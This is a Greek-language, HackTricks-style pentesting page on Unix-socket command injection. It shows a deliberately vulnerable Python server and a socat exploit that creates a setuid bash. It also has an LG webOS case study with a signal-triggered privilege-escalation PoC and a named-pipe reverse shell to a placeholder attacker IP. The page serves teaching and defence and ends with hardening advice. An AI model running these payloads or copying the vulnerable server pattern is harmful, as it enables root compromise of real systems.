# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Παράδειγμα binding ενός socket με Python

Στο ακόλουθο παράδειγμα δημιουργείται ένα **unix socket** (`/tmp/socket_test.s`) και οτιδήποτε **λαμβάνεται** πρόκειται να **εκτελεστεί** από το `os.system`. Γνωρίζω ότι δεν πρόκειται να βρείτε κάτι τέτοιο στην πράξη, αλλά ο στόχος αυτού του παραδείγματος είναι να δείξει πώς μοιάζει ο κώδικας που χρησιμοποιεί unix sockets και πώς γίνεται η διαχείριση της εισόδου στη χειρότερη δυνατή περίπτωση.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Εκτελέστε** τον κώδικα χρησιμοποιώντας `python`: `python s.py` και **ελέγξτε πώς ακούει το socket**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Μελέτη περίπτωσης: Κλιμάκωση μέσω UNIX socket ιδιοκτησίας root, που ενεργοποιείται από signal (LG webOS)

Ορισμένοι προνομιούχοι daemons εκθέτουν ένα UNIX socket ιδιοκτησίας root, το οποίο δέχεται μη αξιόπιστα δεδομένα και συνδέει προνομιούχες ενέργειες με thread IDs και signals. Αν το πρωτόκολλο επιτρέπει σε έναν μη προνομιούχο client να επηρεάσει ποιο native thread θα στοχευτεί, ενδέχεται να μπορείτε να ενεργοποιήσετε ένα προνομιούχο code path και να κάνετε escalation.

Παρατηρούμενο μοτίβο:
- Συνδεθείτε σε ένα socket ιδιοκτησίας root (π.χ. /tmp/remotelogger).
- Δημιουργήστε ένα thread και λάβετε το native thread id (TID).
- Στείλτε το TID (packed) μαζί με padding ως request· λάβετε ένα acknowledgement.
- Παραδώστε ένα συγκεκριμένο signal σε αυτό το TID για να ενεργοποιήσετε την προνομιούχα συμπεριφορά.

Minimal PoC sketch:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Για να το μετατρέψετε σε root shell, μπορεί να χρησιμοποιηθεί ένα απλό μοτίβο named-pipe + nc:
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
- Αυτή η κατηγορία σφαλμάτων προκύπτει από την εμπιστοσύνη σε τιμές που προέρχονται από μη προνομιούχα κατάσταση client (TIDs) και τη σύνδεσή τους με προνομιούχους signal handlers ή logic.
- Ενισχύστε την ασφάλεια επιβάλλοντας credentials στο socket, επικυρώνοντας τις μορφές των μηνυμάτων και αποσυνδέοντας τις προνομιούχες λειτουργίες από thread identifiers που παρέχονται εξωτερικά.

## Αναφορές

- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
